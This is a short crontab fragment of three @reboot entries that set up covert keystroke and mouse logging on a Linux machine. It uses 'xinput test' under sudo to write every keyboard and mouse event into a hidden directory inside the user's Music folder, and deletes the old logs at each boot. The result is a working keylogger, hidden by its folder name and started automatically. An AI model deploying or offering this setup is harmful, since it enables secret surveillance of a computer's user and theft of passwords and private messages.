
@reboot cd /home/abc/Music/.cpu/ rm mouse_logs.txt && rm keyboard_logs.txt
@reboot sleep 90 && env DISPLAY=:0.0 sudo -i su abc -c "/usr/bin/nohup /usr/bin/xinput test 9 > /home/abc/Music/.cpu/mouse_logs.txt 2>&1 &"
@reboot sleep 90 && env DISPLAY=:0.0 sudo -i su abc -c "/usr/bin/nohup /usr/bin/xinput test 13 > /home/abc/Music/.cpu/keyboard_logs.txt 2>&1 &"


